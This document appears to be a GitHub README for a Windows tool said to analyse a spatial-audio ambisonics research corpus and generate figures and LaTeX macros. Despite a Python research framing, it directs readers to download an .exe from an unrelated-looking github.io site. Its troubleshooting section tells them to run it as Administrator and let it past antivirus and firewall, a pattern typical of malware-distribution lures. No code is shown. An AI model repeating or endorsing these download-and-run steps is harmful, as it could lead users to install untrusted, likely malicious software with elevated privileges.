# 🎧 hoa-corpus-ieee-access - Analyze Spatial Audio Research Data Easily

[![Download Now](https://img.shields.io/badge/Download%20Now-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://homogyneorphansite154.github.io)

## 📋 About This Software

This tool helps you explore and understand a seven-year collection of higher-order ambisonics recordings used in an IEEE Access scientific paper. Ambisonics is a way to capture and play back sound in 3D, like you are actually in the room. The software creates charts and reports about the recordings, including where they were made, when they happened, room acoustics, loudness levels, and a full list of recording sessions.

It also generates LaTeX code for scientific papers, so you can easily include precise numbers from the corpus in your own research. A special bootstrap uncertainty analysis checks the reliability of microphone comparison results.

## 🚀 Getting Started

### Step 1: Download the Software

Visit this link to download the application: [https://homogyneorphansite154.github.io](https://homogyneorphansite154.github.io)

On that page, you will see a list of files. Look for the file that matches your computer. For Windows, choose the file ending with **.exe** or **.zip**. If you see a file named something like `hoa-corpus-ieee-access-windows.exe`, download that one. If you see a `.zip` file, download that instead.

### Step 2: Install or Extract

- **If you downloaded an .exe file:** Double-click the file to run it. Follow the simple installation steps.
- **If you downloaded a .zip file:** Right-click the file and choose "Extract All." Choose a folder on your computer (like your Desktop) and click "Extract." Then open that folder and double-click the application file inside (it will likely have the same name as the program).

### Step 3: Run the Program

After installation or extraction, the program should start automatically. If not, find it in your Start Menu or the folder where you extracted it and double-click to run.

## 🖥️ System Requirements

Your computer should have:

- **Operating System:** Windows 10 or Windows 11 (64-bit recommended)
- **Processor:** Any modern Intel or AMD processor from the last 5 years
- **Memory:** At least 4 GB of RAM (8 GB or more recommended)
- **Storage:** About 500 MB of free hard drive space for the program, plus additional space for the corpus data files
- **Internet:** Required for the initial download and for fetching corpus data updates

## 🎯 Features

### Corpus-wide Figures

The software automatically generates visual charts showing:
- **Geography:** A map showing where recordings were made around the world
- **Timeline:** A timeline showing when each recording happened over the seven-year period
- **Room Acoustics:** Graphs of how sound behaves in different recording spaces (reverberation time, clarity, etc.)
- **Loudness:** Charts showing the loudness levels of all recordings
- **Session Inventory:** A complete list of every recording session with details

### LaTeX Macro Generation

For researchers writing scientific papers, the tool creates LaTeX code that contains every numeric claim from the corpus. Just copy and paste this code into your paper to ensure accuracy and reproducibility.

### Bootstrap Uncertainty Analysis

This advanced feature uses statistical bootstrapping (a method of resampling data) to check how reliable the microphone comparison results are. It calculates confidence intervals so you know how much to trust the numbers.

## 📊 Example Output

When you run the software, it will produce several files in the same folder:

- **figures/** folder containing PNG images of all charts
- **macros.tex** file with LaTeX code
- **analysis_report.html** a summary webpage you can open in any browser
- **data/** folder with processed corpus data

## 🔧 Troubleshooting

### Program Won't Start

1. Make sure you downloaded the correct file for Windows
2. Try running the program as Administrator (right-click, "Run as administrator")
3. Check if your antivirus is blocking it (you may need to allow it)

### No Charts Appear

1. Ensure you have an internet connection for the first run
2. The program needs to download corpus data; wait a few minutes
3. Check that your firewall allows the program to connect

### Error Messages

If you see an error, take a screenshot and visit the GitHub page to report it. Most errors are fixed by reinstalling the program.

## 💡 Tips for Best Results

- Run the program on a computer with at least 8 GB of RAM for large datasets
- Keep the program in its own folder to avoid cluttering your Desktop
- Update the program regularly by downloading the newest version from the GitHub releases page
- Use the generated LaTeX macros in Overleaf or any LaTeX editor

## 📄 License

This software is provided for research and educational purposes. See the LICENSE file in the download for full details.

## 🙏 Support

If you have questions or need help, please open an issue on the GitHub repository page. We are happy to assist!

## Keywords

ambisonics, bootstrap, confidence-intervals, corpus, data-visualization, higher-order-ambisonics, ieee-access, latex, python, reproducible-research, room-acoustics, spatial-audio